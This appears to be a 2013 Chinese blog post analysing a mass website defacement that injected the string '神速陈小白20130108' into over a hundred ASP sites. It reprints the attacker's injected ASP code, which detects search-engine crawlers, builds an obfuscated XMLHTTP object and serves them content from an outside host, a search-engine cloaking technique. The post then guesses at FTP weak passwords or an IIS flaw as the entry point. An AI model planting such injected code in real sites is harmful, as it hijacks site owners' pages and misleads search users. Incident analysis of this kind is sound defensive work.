---
title: 130109 关于 神速陈小白20130108 的一些事
layout: post
permalink: /2528.html
categories:
  - Code
tags:
  - asp
  - ftp
  - 猜测
  - 神速陈小白20130108
  - 黑客
---
一夜之间上百家 网站被 头部强制写入 神速陈小白20130108 其中有政府网站 电影网站 医疗网站 新闻网站。 简单分析了下 大概的可能性： 1:关于被黑网站 一些信息： 地域性: www.ychospital.cn 江西省宜春市 电信 www.syszfbz.com 辽宁省沈阳市 移动 也就是说不可能是同一台主机的 被泄露 导致批量修改 2: 代码都是基于 asp + table 的很老的网站 view-source:http://www.ychospital.cn/jkyd\_show.asp?id=789 view-source:http://www.syszfbz.com/ 不属于同一套cms 甚至是多种的 3: 关于黑客代码部分 群里朋友发我的 在这里贴下： sub Session\_OnStart user\_agent=Request.ServerVariables("HTTP\_USER\_AGENT") httpuser=LCase(request.servervariables("http\_user\_agent")) if instr(httpuser,"baidu")>0 or instr(httpuser,"google")>0 or instr(httpuser,"sogou")>0 or instr(httpuser,"soso")>0 then url=("http://www.shensumail.com/?"&#038;request.ServerVariables("QUERY\_STRING")&#038;"") Set ObjXMLHTTP=Server.createobject("MSX"+"ML2.s"+"erv"+"erXML"+"HTTP") ObjXMLHTTP.Open "GET",url,False ObjXMLHTTP.send GetHtml=ObjXMLHTTP.responseBody Set ObjXMLHTTP=Nothing set objStream = Server.CreateObject("Adodb.Stream") objStream.Type = 1 objStream.Mode =3 objStream.Open objStream.Write GetHtml objStream.Position = 0 objStream.Type = 2 objStream.Charset = "gb2312" GetHtml = objStream.ReadText objStream.Close key1=lcase(GetHtml) key1=Replace(key1&#038;"","-istxt-","") response.Write key1 end if end sub 类似于 一种淘金链写法 网站判断 来源用户的 user-agent 如果是搜索引擎 则展示 远程站点内容 上述被黑站点基本都是被修改的 总结： 1: ftp 弱密码扫描 2: asp iis 爆发 某种 致命漏洞 如果你有其他想法可以给我留言一起探讨